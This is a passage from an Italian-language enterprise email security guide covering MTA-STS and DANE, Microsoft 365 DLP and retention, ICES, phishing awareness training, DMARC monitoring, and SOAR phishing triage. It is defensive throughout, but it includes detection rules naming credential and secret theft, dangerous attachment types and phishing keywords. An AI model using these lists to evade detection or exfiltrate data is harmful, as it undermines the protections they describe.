# _mta-sts.example.com. IN TXT "v=STSv1; id=20260524001"

# 4. Pubblicare record TLS-RPT per ricevere report sui fallimenti
# _smtp._tls.example.com. IN TXT "v=TLSRPTv1; rua=mailto:tls-reports@example.com"

# 5. Monitorare i report TLS-RPT per 2-4 settimane in mode=testing

# 6. Passare a mode=enforce dopo aver verificato assenza di problemi
sed -i 's/mode: testing/mode: enforce/' /var/www/mta-sts/.well-known/mta-sts.txt
# Aggiornare l'id nel record DNS per forzare il re-fetch della policy
```

### 12.3 DANE — DNS-Based Authentication of Named Entities

DANE (RFC 7672 per SMTP) utilizza record TLSA pubblicati in DNS protetto da DNSSEC per associare un certificato TLS specifico a un server mail. A differenza di MTA-STS, DANE non richiede un web server separato ma richiede DNSSEC sulla zona DNS.

#### Record TLSA

```dns
; Formato: _port._protocol.hostname IN TLSA usage selector matching-type certificate-data
_25._tcp.mail.example.com. IN TLSA 3 1 1 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
```

**Parametri TLSA:**

| Campo | Valore | Significato |
|-------|--------|-------------|
| Usage | 3 (DANE-EE) | Trust anchor è il certificato del server stesso |
| Usage | 2 (DANE-TA) | Trust anchor è la CA che ha emesso il certificato |
| Selector | 0 | Hash del certificato completo |
| Selector | 1 | Hash solo della chiave pubblica (SubjectPublicKeyInfo) |
| Matching | 1 | SHA-256 hash |
| Matching | 2 | SHA-512 hash |

**Raccomandazione:** Usare `3 1 1` (DANE-EE, chiave pubblica, SHA-256) per semplicità nella rotazione dei certificati — il record TLSA deve essere aggiornato solo quando cambia la chiave pubblica, non quando il certificato viene rinnovato con la stessa chiave.

#### Microsoft Exchange Online e DANE

A partire dal 2025, Microsoft Exchange Online supporta DANE in uscita (outbound DANE) per verificare i record TLSA dei domini destinatari. Nel 2026, Microsoft richiede la migrazione del record MX a `mx.microsoft.com`, che abilita automaticamente il supporto DANE inbound con DNSSEC.

```dns
; Record MX aggiornato per Exchange Online (2026)
example.com.  IN  MX  10 mx.microsoft.com.

; Record TLSA pubblicato da Microsoft
_25._tcp.mx.microsoft.com. IN TLSA 3 1 1 <hash>
```

### 12.4 MTA-STS vs DANE — Quando Usare Quale

| Criterio | MTA-STS | DANE |
|----------|---------|------|
| Dipendenza DNSSEC | No | Sì (obbligatorio) |
| Complessità deployment | Bassa (web server + DNS TXT) | Media-alta (DNSSEC + TLSA) |
| Resistenza cache poisoning | Parziale (HTTPS trust model) | Completa (DNSSEC) |
| Supporto provider cloud | Ampio (M365, Google, ecc.) | In crescita (M365 outbound 2025) |
| Granularità | Per dominio | Per hostname:porta |
| Trust-on-first-use (TOFU) | Sì (prima policy fetch) | No (DNSSEC dalla prima query) |

**Strategia raccomandata 2026:** Implementare MTA-STS come baseline immediata (non richiede DNSSEC) e aggiungere DANE quando l'infrastruttura DNS supporta DNSSEC. I due meccanismi sono complementari e non in conflitto.

---

## 13. Data Loss Prevention per Email

### 13.1 Strategia DLP per le Comunicazioni Email

La Data Loss Prevention (DLP) per email previene la fuoriuscita di dati sensibili attraverso il canale email — sia intenzionale (insider threat, esfiltrazione) che accidentale (errore umano, destinatario sbagliato). Nel 2025-2026, le policy DLP email devono coprire non solo il contenuto del messaggio ma anche allegati, metadati, e interazioni con servizi cloud collegati.

#### Classificazione dei Dati Protetti

| Categoria | Esempi | Regolamentazione | Azione DLP |
|-----------|--------|-----------------|------------|
| PII (Personally Identifiable Information) | Codice fiscale, carta d'identità, indirizzo | GDPR, CCPA | Blocco + notifica |
| Dati finanziari | IBAN, numeri carta di credito, SWIFT | PCI DSS | Blocco + crittografia forzata |
| Dati sanitari | Codice paziente, diagnosi, cartelle cliniche | HIPAA, GDPR Art. 9 | Blocco + escalation compliance |
| Proprietà intellettuale | Codice sorgente, brevetti, design | Trade secret laws | Blocco + alert SOC |
| Dati classificati interni | Documenti strategici, M&A, roadmap | Policy aziendale | Blocco + audit trail |
| Credenziali | Password, API key, token, certificati | Tutte | Blocco immediato + rotazione |

### 13.2 Implementazione DLP in Microsoft 365

```powershell
# Creazione policy DLP multi-regola per email
New-DlpCompliancePolicy -Name "Protezione Dati Sensibili Email" `
    -ExchangeLocation All `
    -SharePointLocation All `
    -OneDriveLocation All `
    -TeamsLocation All `
    -Mode Enable `
    -Comment "Policy DLP per protezione PII, dati finanziari e sanitari"

# Regola 1: Rilevamento codici fiscali italiani in uscita
New-DlpComplianceRule -Name "Blocco CF in Email Esterne" `
    -Policy "Protezione Dati Sensibili Email" `
    -ContentContainsSensitiveInformation @(
        @{Name="Italy Fiscal Code"; minCount=1; confidenceLevel="High"},
        @{Name="Italy Driver's License Number"; minCount=1; confidenceLevel="High"}
    ) `
    -ExceptIfSentTo "compliance@example.com" `
    -BlockAccess $true `
    -NotifyUser "SenderNotifyOnly" `
    -NotifyPolicyTipCustomText "Questo messaggio contiene dati personali protetti. Contattare il team compliance per l'invio autorizzato." `
    -GenerateIncidentReport "SiteAdmin" `
    -IncidentReportContent "All" `
    -ReportSeverityLevel "High"

# Regola 2: Rilevamento numeri di carta di credito
New-DlpComplianceRule -Name "Blocco CC Numbers" `
    -Policy "Protezione Dati Sensibili Email" `
    -ContentContainsSensitiveInformation @{
        Name = "Credit Card Number"
        minCount = 1
        confidenceLevel = "High"
    } `
    -BlockAccess $true `
    -NotifyUser "SenderNotifyOnly","NotifyOwner" `
    -GenerateIncidentReport "SiteAdmin" `
    -ReportSeverityLevel "High"

# Regola 3: Rilevamento codice sorgente in allegati
New-DlpComplianceRule -Name "Alert Codice Sorgente in Allegato" `
    -Policy "Protezione Dati Sensibili Email" `
    -ContentContainsSensitiveInformation @{
        Name = "Source Code"
        minCount = 5
        confidenceLevel = "Medium"
    } `
    -SentToScope "NotInOrganization" `
    -BlockAccess $false `
    -NotifyUser "SenderNotifyOnly" `
    -GenerateIncidentReport "SiteAdmin" `
    -ReportSeverityLevel "Medium"

# Regola 4: Blocco invio password e credenziali via email
New-DlpComplianceRule -Name "Blocco Credenziali in Email" `
    -Policy "Protezione Dati Sensibili Email" `
    -ContentContainsSensitiveInformation @(
        @{Name="Azure AD Client Secret"; minCount=1; confidenceLevel="High"},
        @{Name="General Password"; minCount=1; confidenceLevel="High"}
    ) `
    -BlockAccess $true `
    -NotifyUser "SenderNotifyOnly" `
    -NotifyPolicyTipCustomText "Non inviare credenziali via email. Utilizzare un password manager o un canale sicuro." `
    -GenerateIncidentReport "SiteAdmin" `
    -ReportSeverityLevel "High"
```

### 13.3 DLP con Regole di Trasporto Exchange

Per organizzazioni senza licenze Microsoft Purview, le transport rule offrono DLP di base:

```powershell
# Rilevamento pattern IBAN in email esterne
New-TransportRule -Name "DLP - Detect IBAN in Outbound" `
    -SentToScope "NotInOrganization" `
    -SubjectOrBodyMatchesPatterns @(
        "[A-Z]{2}\d{2}\s?\d{4}\s?\d{4}\s?\d{4}\s?\d{4}\s?\d{0,4}",
        "IT\d{2}[A-Z]\d{22}"
    ) `
    -SetSCL 9 `
    -SetHeaderName "X-DLP-Match" `
    -SetHeaderValue "IBAN-detected" `
    -GenerateIncidentReport "secops@example.com" `
    -IncidentReportOriginalMail "IncludeOriginalMail"

# Blocco allegati con estensioni pericolose verso l'esterno
New-TransportRule -Name "DLP - Block Sensitive File Extensions Outbound" `
    -SentToScope "NotInOrganization" `
    -AttachmentExtensionMatchesWords @("sql","bak","mdb","accdb","pst","ost") `
    -RejectMessageReasonText "L'invio di file database/backup verso l'esterno non e' consentito. Contattare IT Security." `
    -GenerateIncidentReport "secops@example.com"

# Avviso per allegati di grandi dimensioni verso l'esterno
New-TransportRule -Name "DLP - Large Attachment Alert" `
    -SentToScope "NotInOrganization" `
    -AttachmentSizeOver 10MB `
    -GenerateIncidentReport "secops@example.com" `
    -IncidentReportContent "All" `
    -SetHeaderName "X-DLP-LargeAttachment" `
    -SetHeaderValue "true"
```

### 13.4 Metriche DLP e Tuning

Le policy DLP richiedono tuning continuo per bilanciare protezione e produttività:

| Metrica | Target | Azione se fuori target |
|---------|--------|----------------------|
| False positive rate | < 2% | Aggiustare confidence level, aggiungere eccezioni |
| True positive rate | > 95% per dati regolamentati | Raffinare pattern, aggiungere custom sensitive info types |
| Override rate | < 10% | Investigare motivi override, rivedere policy |
| Incident response time | < 4 ore | Automatizzare triage con SOAR |
| User compliance | > 90% invii corretti dopo training | Rafforzare formazione, semplificare workflow |

---

## 14. Archiviazione Email e Conformità Normativa

### 14.1 Requisiti di Retention per Settore

L'archiviazione email è un requisito legale e normativo in numerosi settori. Le policy di retention devono bilanciare requisiti di conformità, costi di storage, e rischio legale derivante dalla conservazione eccessiva.

| Settore | Normativa | Periodo di Retention | Note |
|---------|-----------|---------------------|------|
| Finanziario | MiFID II, SEC Rule 17a-4, FINRA | 5-7 anni | Archiviazione tamper-proof (WORM) |
| Sanitario | HIPAA | 6 anni | Include allegati con PHI |
| Pubblico/PA | D.Lgs. 82/2005 (CAD) | 10 anni (variabile) | Conservazione sostitutiva a norma |
| Legale | Professional conduct rules | 5-7 anni post-caso | Inclusa corrispondenza client |
| Generale GDPR | GDPR Art. 5(1)(e) | Minimizzazione — solo quanto necessario | Giustificazione documentata per ogni periodo |
| Fiscale | Normativa fiscale nazionale | 10 anni (Italia) | Documenti fiscalmente rilevanti |

### 14.2 Architettura di Archiviazione Email

```
┌───────────────┐    ┌──────────────────┐    ┌──────────────────┐
│   Mailbox     │───▶│  Journal Rule /   │───▶│  Archive Store   │
│   Primaria    │    │  Retention Policy │    │  (WORM/Immutable)│
└───────────────┘    └──────────────────┘    └──────────────────┘
                            │                         │
                            ▼                         ▼
                     ┌──────────────┐         ┌──────────────┐
                     │  Compliance  │         │  eDiscovery  │
                     │  Search      │         │  Export      │
                     └──────────────┘         └──────────────┘
```

### 14.3 Microsoft 365 — Retention e Archiviazione

```powershell
# Abilitazione archive mailbox per tutti gli utenti
Get-Mailbox -ResultSize Unlimited -Filter {ArchiveStatus -eq "None"} |
    Enable-Mailbox -Archive

# Verifica stato archivio
Get-Mailbox -ResultSize Unlimited |
    Select-Object DisplayName, ArchiveStatus, ArchiveQuota, ArchiveName

# Creazione retention policy con tag specifici
New-RetentionPolicyTag -Name "Elimina dopo 7 anni" `
    -Type All `
    -RetentionAction DeleteAndAllowRecovery `
    -AgeLimitForRetention 2555 `
    -RetentionEnabled $true `
    -Comment "Eliminazione automatica email dopo 7 anni per conformita'"

New-RetentionPolicyTag -Name "Sposta in archivio dopo 1 anno" `
    -Type All `
    -RetentionAction MoveToArchive `
    -AgeLimitForRetention 365 `
    -RetentionEnabled $true

# Creazione retention policy composta
New-RetentionPolicy -Name "Corporate Retention Policy" `
    -RetentionPolicyTagLinks @(
        "Elimina dopo 7 anni",
        "Sposta in archivio dopo 1 anno",
        "Default 2 year delete"
    )

# Applicazione policy a tutti gli utenti
Get-Mailbox -ResultSize Unlimited |
    Set-Mailbox -RetentionPolicy "Corporate Retention Policy"

# Microsoft Purview — Retention Label per conformità
New-ComplianceTag -Name "Financial Record - 7yr" `
    -RetentionAction Keep `
    -RetentionDuration 2555 `
    -RetentionType CreationAgeInDays `
    -IsRecordLabel $true `
    -Comment "Record regolamentato finanziario — retention 7 anni obbligatoria"

# Pubblicazione label a tutte le location
New-RetentionCompliancePolicy -Name "Financial Records Policy" `
    -ExchangeLocation All `
    -PublishComplianceTag "Financial Record - 7yr"
```

### 14.4 Journaling per Conformità

Il journaling cattura una copia di ogni messaggio inviato o ricevuto, indipendentemente dalle azioni dell'utente (eliminazione, modifica). È obbligatorio per conformità finanziaria (SEC, FINRA, MiFID II).

```powershell
# Journal rule per catturare tutte le comunicazioni esterne
New-JournalRule -Name "External Communications Journal" `
    -JournalEmailAddress "journal-archive@example.com" `
    -Scope Global `
    -Enabled $true

# Journal rule per utenti specifici ad alto rischio
New-JournalRule -Name "Executive Communications Journal" `
    -JournalEmailAddress "exec-journal@example.com" `
    -Scope Internal `
    -Recipient "ceo@example.com" `
    -Enabled $true

# Verifica journal rules attive
Get-JournalRule | Select-Object Name, Scope, JournalEmailAddress, Recipient, Enabled
```

### 14.5 Conservazione a Norma — Contesto Italiano

In Italia, la conservazione sostitutiva delle comunicazioni email rilevanti è regolata dal Codice dell'Amministrazione Digitale (CAD, D.Lgs. 82/2005) e dalle Linee Guida AgID. I requisiti includono:

**Firma digitale qualificata:** I documenti conservati devono essere firmati con firma digitale qualificata o sigillo elettronico qualificato.

**Marca temporale:** Ogni documento archiviato deve avere una marca temporale qualificata che certifica l'esistenza del documento in un determinato momento.

**Responsabile della conservazione:** L'organizzazione deve designare un responsabile della conservazione che garantisce la conformità del processo.

**Formato di conservazione:** I messaggi email devono essere conservati in formato standard (EML/MBOX) con tutti gli header originali, allegati, e metadati di delivery. Il formato PDF/A è accettato per la versione visualizzabile ma non sostituisce l'originale.

---

## 15. Integrated Cloud Email Security — ICES

### 15.1 Evoluzione dell'Architettura Email Security

L'architettura della sicurezza email si è evoluta attraverso tre generazioni distinte:

**Generazione 1 — Secure Email Gateway (SEG) tradizionale (2000-2015):** Appliance hardware o VM posizionata nel percorso del mail flow (inline). Richiede modifica del record MX per indirizzare il traffico attraverso il gateway. Analisi basata su signature, reputation list, e regole statiche. Esempi: Cisco IronPort, Barracuda ESG, Mimecast.

**Generazione 2 — Cloud-native SEG (2015-2022):** Stessa architettura inline ma in cloud. Il record MX punta al provider SEG cloud, che analizza il traffico prima di inoltrarlo al mail server. Aggiunge sandboxing, URL rewriting, e machine learning di base. Esempi: Proofpoint, Mimecast Cloud, Microsoft EOP.

**Generazione 3 — ICES API-based (2020-oggi):** Integrazione tramite API direttamente con la piattaforma email (Microsoft 365 Graph API, Google Workspace API). Nessuna modifica al record MX. Analisi post-delivery con capacità di remediation retroattiva. AI/ML avanzato per rilevamento comportamentale. Esempi: Abnormal Security, Darktrace Email, Material Security, Ironscales.

### 15.2 Come Funziona ICES

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│  Email       │───▶│  Microsoft   │───▶│  Mailbox     │
│  in ingresso │    │  EOP/MDO     │    │  (Inbox)     │
└──────────────┘    └──────────────┘    └──────────────┘
                                               │
                                               ▼ (API polling/webhook)
                                        ┌──────────────┐
                                        │  ICES Engine  │
                                        │  (AI/ML)      │
                                        │  Analisi post-│
                                        │  delivery     │
                                        └──────────────┘
                                               │
                                    ┌──────────┼──────────┐
                                    ▼          ▼          ▼
                              ┌─────────┐ ┌────────┐ ┌─────────┐
                              │Quarantine│ │ Alert  │ │ Enrich  │
                              │/Remove   │ │ SOC    │ │ Context │
                              └─────────┘ └────────┘ └─────────┘
```

**Vantaggi dell'approccio API-based:**

- Nessuna modifica MX — deployment in minuti, non settimane
- Visibilità su email interne (lateral phishing da account compromessi)
- Contesto comportamentale — il motore apprende i pattern di comunicazione normali per ogni utente
- Analisi del social graph — identifica anomalie nelle relazioni mittente-destinatario
- Remediation retroattiva — può rimuovere messaggi già consegnati quando nuove informazioni di threat intel emergono
- Complementare al SEG/EOP — non in sostituzione ma come layer aggiuntivo

**Limitazioni:**

- Dipendenza dalle API del provider email (rate limits, latency)
- Finestra di esposizione — il messaggio raggiunge la inbox prima dell'analisi ICES (tipicamente 1-5 secondi)
- Costo aggiuntivo sopra la licenza M365/Google Workspace
- Richiede accesso privilegiato all'ambiente email (Global Reader o equivalente)

### 15.3 ICES vs SEG — Strategia di Coesistenza

Nel 2025-2026, la strategia raccomandata da analisti Gartner e Forrester è un approccio layered:

**Layer 1 — EOP/MDO nativo:** Filtro primario incluso nella licenza M365. Gestisce il volume — spam, malware noto, SPF/DKIM/DMARC enforcement.

**Layer 2 — SEG (opzionale):** Per organizzazioni con requisiti specifici di compliance, DLP avanzata, o necessità di gestione centralizzata multi-piattaforma.

**Layer 3 — ICES:** Analisi comportamentale post-delivery per rilevare attacchi sofisticati che sfuggono ai layer precedenti — BEC, spear-phishing personalizzato, account compromise, lateral phishing.

Secondo il report Gartner 2025, entro il 2026 il 20% delle soluzioni anti-phishing enterprise saranno API-based ICES, rispetto al 5% nel 2022. Il mercato ICES è stimato a $1.41 miliardi nel 2024, con crescita prevista a $3.68 miliardi entro il 2031.

---

## 16. Security Awareness Training e Simulazioni Phishing

### 16.1 Programma di Formazione sulla Sicurezza Email

Un programma di security awareness efficace nel 2025-2026 non si limita a presentazioni annuali obbligatorie — richiede un approccio comportamentale continuo basato su simulazioni regolari, micro-learning, e metriche di miglioramento misurabili.

#### Componenti del Programma

**Formazione iniziale (onboarding):** Ogni nuovo dipendente riceve formazione obbligatoria di 60-90 minuti entro i primi 5 giorni lavorativi. Copre: riconoscimento phishing, procedure di segnalazione, policy aziendale email, responsabilità individuale. I neoassunti sono target primari per gli attaccanti BEC perché non conoscono i processi interni.

**Micro-learning continuo:** Moduli di 3-5 minuti distribuiti mensilmente. Coprono scenari reali basati sulle minacce attuali contro l'organizzazione. Adattivi — il contenuto si personalizza in base alla performance del dipendente nelle simulazioni.

**Simulazioni phishing regolari:** Campagne di phishing simulato ogni 2-4 settimane con scenari progressivamente più sofisticati. Le simulazioni devono coprire tutte le tipologie di attacco: credential harvesting, BEC, malware delivery, quishing, callback phishing.

**Formazione just-in-time:** Quando un utente fallisce una simulazione (clicca un link o inserisce credenziali), riceve immediatamente un modulo formativo contestuale che spiega cosa è successo, come avrebbe potuto riconoscere l'attacco, e le conseguenze di un attacco reale.

### 16.2 KPI e Metriche di Efficacia

La misurazione dell'efficacia del programma richiede metriche che vadano oltre il semplice click rate:

| Metrica | Definizione | Target Iniziale | Target Maturo (12 mesi) |
|---------|-------------|-----------------|------------------------|
| Phish Click Rate | % utenti che cliccano link simulato | < 15% | < 5% |
| Credential Submission Rate | % utenti che inseriscono credenziali | < 8% | < 2% |
| Report Rate | % utenti che segnalano la simulazione | > 30% | > 70% |
| Report-to-Click Ratio | Segnalazioni / Click | > 1.0 | > 5.0 |
| Mean Time to Report | Tempo medio per segnalare phishing | < 60 min | < 15 min |
| Repeat Offender Rate | % utenti che falliscono 2+ simulazioni consecutive | < 15% | < 5% |
| Training Completion Rate | % completamento moduli obbligatori | > 90% | > 98% |

**Dato di riferimento 2025:** Le organizzazioni che implementano simulazioni regolari vedono il click rate scendere da una media del 37.9% a 4.7% dopo 90 giorni di training e simulazioni (fonte: KnowBe4 Phishing Industry Benchmarking Report 2025). I programmi basati sul cambiamento comportamentale rendono gli utenti 6 volte meno propensi al click e 7 volte più propensi alla segnalazione rispetto ai programmi tradizionali.

### 16.3 Gestione dei Repeat Offender

Gli utenti che falliscono ripetutamente le simulazioni richiedono un percorso di intervento progressivo:

**Livello 1 (primo fallimento):** Training just-in-time automatico + notifica al manager. Nessuna azione punitiva.

**Livello 2 (secondo fallimento in 90 giorni):** Sessione di coaching individuale con il team security. Modulo formativo avanzato con assessment finale.

**Livello 3 (terzo fallimento in 180 giorni):** Escalation a HR e management. Restrizioni tecniche aggiuntive (enhanced filtering, link sandboxing più aggressivo, blocco allegati da sorgenti esterne). Sessione formativa obbligatoria con attestazione.

**Livello 4 (pattern persistente):** Valutazione di idoneità al ruolo se il ruolo comporta accesso a dati sensibili o finanziari. Considerare restrizioni di accesso permanenti.

### 16.4 Piattaforme di Simulazione e Formazione

| Piattaforma | Punti di Forza | Integrazione |
|-------------|----------------|-------------|
| KnowBe4 | Libreria template più ampia, PhishER per triage | M365, Google, API |
| Proofpoint SAT | Integrata con Proofpoint gateway, threat intel | Proofpoint TAP |
| Cofense PhishMe | Focus su segnalazione, community threat intel | M365, Google, SEG |
| Microsoft Attack Simulation | Inclusa in Defender Plan 2, zero costo aggiuntivo | M365 nativo |
| Hoxhunt | Gamification, adaptive training, focus comportamentale | M365, Google, Slack |
| Ironscales | ICES + simulation combinati, crowdsourced detection | M365, Google |

---

## 17. Analisi Report DMARC e Monitoraggio Continuo

### 17.1 Architettura di Monitoraggio DMARC

L'analisi dei report DMARC aggregate (RUA) è il fondamento della visibilità sull'uso e l'abuso del proprio dominio email. Senza analisi sistematica dei report, l'organizzazione non può identificare mittenti non autorizzati, configurazioni SPF/DKIM errate, o attacchi di spoofing in corso.

#### Pipeline di Analisi con parsedmarc (Open Source)

```bash
# Installazione parsedmarc con Elasticsearch backend
pip install parsedmarc[elasticsearch]

# Configurazione parsedmarc
cat > /etc/parsedmarc/parsedmarc.ini << 'EOF'
[general]
save_aggregate = True
save_forensic = True
nameservers = 8.8.8.8, 1.1.1.1
output = /var/log/parsedmarc/

[imap]
host = imap.example.com
port = 993
ssl = True
user = dmarc-reports@example.com
password = REDACTED
watch = True

[elasticsearch]
hosts = http://localhost:9200
ssl = False
monthly_indexes = True
number_of_shards = 1
number_of_replicas = 0

[smtp]
host = localhost
port = 25
from = parsedmarc@example.com
to = secops@example.com
EOF

# Esecuzione come servizio systemd
cat > /etc/systemd/system/parsedmarc.service << 'EOF'
[Unit]
Description=parsedmarc DMARC report analyzer
After=network.target elasticsearch.service

[Service]
Type=simple
User=parsedmarc
ExecStart=/usr/local/bin/parsedmarc -c /etc/parsedmarc/parsedmarc.ini
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF

systemctl enable --now parsedmarc
```

#### Dashboard Grafana/Kibana per Visualizzazione

Una volta che i report DMARC sono indicizzati in Elasticsearch, è possibile creare dashboard operative che mostrano:

- **Volume per sorgente IP:** Identificazione immediata di mittenti non autorizzati
- **Tasso di pass/fail SPF e DKIM:** Monitoraggio della salute dell'autenticazione
- **Distribuzione geografica:** IP di invio mappati per paese — anomalie geografiche indicano spoofing
- **Trend temporali:** Variazioni nel volume e nei risultati di autenticazione nel tempo
- **Top failing sources:** I server che più frequentemente falliscono l'autenticazione, con priorità per la correzione

### 17.2 Interpretazione dei Report Aggregate

I report aggregate DMARC sono documenti XML generati dai server riceventi (Google, Microsoft, Yahoo, ecc.) e inviati all'indirizzo specificato nel tag `rua` del record DMARC. Ogni report copre un periodo di 24 ore e contiene i risultati aggregati per ogni combinazione di IP sorgente e risultato di autenticazione.

**Scenari comuni da analizzare:**

**SPF pass, DKIM pass, DMARC pass:** Configurazione corretta. Il mittente è autorizzato e autenticato.

**SPF pass, DKIM fail, DMARC pass:** Il messaggio passa per allineamento SPF. Il fallimento DKIM può indicare un intermediario che ha modificato il messaggio (mailing list, forwarding). Investigare se il mittente dovrebbe firmare con DKIM.

**SPF fail, DKIM pass, DMARC pass:** Tipico di servizi di terze parti che firmano con DKIM ma inviano da IP non inclusi nell'SPF del dominio. Aggiungere gli IP al record SPF o accettare il pass DKIM come sufficiente.

**SPF fail, DKIM fail, DMARC fail:** Mittente non autorizzato. Se il volume è significativo, potrebbe essere un attacco di spoofing in corso. Verificare che non sia un servizio legittimo non ancora configurato (newsletter, CRM, ticketing system).

### 17.3 Monitoraggio Proattivo e Alerting

```bash
#!/bin/bash
# dmarc_alert_check.sh — Controllo giornaliero anomalie DMARC
# Eseguire via cron: 0 9 * * * /usr/local/bin/dmarc_alert_check.sh

ES_HOST="http://localhost:9200"
ALERT_EMAIL="secops@example.com"
DATE_YESTERDAY=$(date -d "yesterday" +%Y-%m-%d)

# Query Elasticsearch per fallimenti DMARC nelle ultime 24 ore
FAIL_COUNT=$(curl -s "${ES_HOST}/dmarc_aggregate-*/_count" \
    -H "Content-Type: application/json" \
    -d '{
        "query": {
            "bool": {
                "must": [
                    {"term": {"policy_evaluated.disposition": "reject"}},
                    {"range": {"date_range.begin": {"gte": "now-24h"}}}
                ]
            }
        }
    }' | python3 -c "import sys,json; print(json.load(sys.stdin).get('count',0))")

# Query per nuovi IP sorgente non visti prima
NEW_SOURCES=$(curl -s "${ES_HOST}/dmarc_aggregate-*/_search" \
    -H "Content-Type: application/json" \
    -d '{
        "size": 0,
        "query": {"range": {"date_range.begin": {"gte": "now-24h"}}},
        "aggs": {
            "new_sources": {
                "terms": {"field": "source_ip", "size": 50}
            }
        }
    }' | python3 -c "
import sys, json
data = json.load(sys.stdin)
buckets = data.get('aggregations',{}).get('new_sources',{}).get('buckets',[])
for b in buckets:
    print(f\"{b['key']}: {b['doc_count']} messaggi\")
")

# Generazione alert se necessario
if [ "${FAIL_COUNT}" -gt 100 ]; then
    echo "ALERT: ${FAIL_COUNT} messaggi DMARC reject nelle ultime 24 ore.
    
Nuove sorgenti rilevate:
${NEW_SOURCES}

Azione richiesta: verificare se si tratta di spoofing o di un servizio legittimo non configurato." | \
    mail -s "[DMARC ALERT] Volume anomalo di fallimenti - ${DATE_YESTERDAY}" "${ALERT_EMAIL}"
fi
```

### 17.4 Strumenti di Analisi DMARC

| Strumento | Tipo | Funzionalità Chiave |
|-----------|------|-------------------|
| parsedmarc + Elasticsearch | Open-source, self-hosted | Analisi completa, dashboard Kibana/Grafana, automazione |
| dmarcian | SaaS commerciale | Interfaccia intuitiva, DNS wizard, XML viewer |
| EasyDMARC | SaaS commerciale | Report aggregati visuali, alerting, API |
| Valimail | SaaS enterprise | DMARC enforcement automatizzato, BIMI support |
| PowerDMARC | SaaS commerciale | Multi-tenant, forensic reporting, threat intelligence |
| MXToolbox | SaaS/free tier | Analisi singoli report, diagnostic tools |
| Postmark DMARC | Gratuito | Report settimanali via email, digest semplificato |

---

## 18. SOAR e Automazione Incident Response Email

### 18.1 Automazione della Risposta agli Incidenti Email

L'automazione della risposta agli incidenti email tramite piattaforme SOAR (Security Orchestration, Automation and Response) riduce drasticamente il Mean Time to Detect (MTTD) e il Mean Time to Respond (MTTR) per le minacce email. Un analista SOC che gestisce manualmente un incident di phishing impiega mediamente 30-60 minuti per completare il triage; un playbook SOAR automatizzato esegue le stesse operazioni in 2-5 minuti.

### 18.2 Playbook SOAR — Phishing Triage Automatizzato

Il playbook seguente descrive il workflow automatizzato per la gestione di email di phishing segnalate dagli utenti:

```
┌────────────────────┐
│  Trigger: Email     │
│  segnalata da       │
│  utente (Report     │
│  Phishing Button)   │
└─────────┬──────────┘
          ▼
┌────────────────────┐
│  1. Ingestione     │
│  - Parse header    │
│  - Estrai IOC      │
│    (URL, IP, hash, │
│     sender, domain)│
└─────────┬──────────┘
          ▼
┌────────────────────┐
│  2. Enrichment     │
│  - VirusTotal      │
│  - URLhaus         │
│  - AbuseIPDB       │
│  - WHOIS lookup    │
│  - Domain age      │
│  - Sandbox URL     │
│  - Hash lookup     │
└─────────┬──────────┘
          ▼
┌────────────────────┐     ┌──────────────────┐
│  3. Scoring        │────▶│  Score < 30:      │
│  - Calcola threat  │     │  Spam/Marketing   │
│    score composito │     │  → Auto-close     │
│  - Threshold:      │     │  → Feedback utente│
│    High (>70)      │     └──────────────────┘
│    Medium (30-70)  │
│    Low (<30)       │     ┌──────────────────┐
│                    │────▶│  Score 30-70:     │
│                    │     │  → Queue per      │
│                    │     │    analyst review  │
│                    │     └──────────────────┘
│                    │
│                    │     ┌──────────────────┐
│                    │────▶│  Score > 70:      │
│                    │     │  → Auto-remediate │
└────────────────────┘     └────────┬─────────┘
                                    ▼
                           ┌──────────────────┐
                           │  4. Remediation   │
                           │  automatica:      │
                           │  - Purge from all │
                           │    mailboxes      │
                           │  - Block sender   │
                           │  - Block URL      │
                           │  - Update IOC feed│
                           │  - Notify user    │
                           │  - Create ticket  │
                           └──────────────────┘
```

### 18.3 Implementazione Playbook con Microsoft Sentinel

```kql
// KQL — Query Sentinel per rilevamento phishing con indicatori multipli
let PhishingIndicators = dynamic([
    "password", "verify", "account", "suspended", "urgent", 
    "wire transfer", "invoice", "payment", "credentials"
]);
EmailEvents
| where Timestamp > ago(1h)
| where EmailDirection == "Inbound"
| where SenderFromDomain !in ("example.com", "partner.com")
| join kind=leftouter (
    EmailUrlInfo
    | where UrlDomain !in ("microsoft.com", "office.com", "sharepoint.com")
    | summarize SuspiciousUrls = count() by NetworkMessageId
) on NetworkMessageId
| join kind=leftouter (
    EmailAttachmentInfo
    | where FileType in ("exe", "scr", "lnk", "iso", "img", "vbs", "js", "hta")
    | summarize DangerousAttachments = count() by NetworkMessageId
) on NetworkMessageId
| extend SubjectHasPhishingKeyword = Subject has_any (PhishingIndicators)
| extend ThreatScore = 
    iff(SuspiciousUrls > 0, 30, 0) +
    iff(DangerousAttachments > 0, 40, 0) +
    iff(SubjectHasPhishingKeyword, 15, 0) +
    iff(AuthenticationDetails contains "dmarc=fail", 25, 0) +
    iff(AuthenticationDetails contains "spf=fail", 15, 0)
| where ThreatScore > 50
| project Timestamp, SenderFromAddress, RecipientEmailAddress, Subject, 
         ThreatScore, SuspiciousUrls, DangerousAttachments, NetworkMessageId
| sort by ThreatScore desc
```

```powershell
# PowerShell — Remediation automatica per messaggi ad alto rischio
# Integrato con Logic App / Sentinel Playbook

function Invoke-EmailRemediation {
    param(
        [string]$NetworkMessageId,
        [string]$SenderAddress,
        [string[]]$MaliciousUrls,
        [string]$IncidentId
    )
    
    # 1. Purge messaggio da tutte le mailbox
    $purgeAction = New-ComplianceSearchAction `
        -SearchName "Phishing_Purge_${IncidentId}" `
        -Purge -PurgeType SoftDelete -Confirm:$false
    
    # 2. Blocco sender nel tenant
    New-TenantAllowBlockListItems `
        -ListType Sender `
        -Entries $SenderAddress `
        -Block `
        -NoExpiration `
        -Notes "Auto-blocked by SOAR playbook - Incident ${IncidentId}"
    
    # 3. Blocco URL malevoli
    foreach ($url in $MaliciousUrls) {
        New-TenantAllowBlockListItems `
            -ListType Url `
            -Entries $url `
            -Block `
            -ExpirationDate (Get-Date).AddDays(90) `
            -Notes "Phishing URL - Incident ${IncidentId}"
    }
    
    # 4. Cerca messaggi correlati (stessa campagna)
    $correlatedMessages = Get-MessageTrace `
        -SenderAddress $SenderAddress `
        -StartDate (Get-Date).AddHours(-48) `
        -EndDate (Get-Date) |
        Where-Object { $_.Status -eq "Delivered" }
    
    Write-Output "Remediation completata per incident ${IncidentId}:"
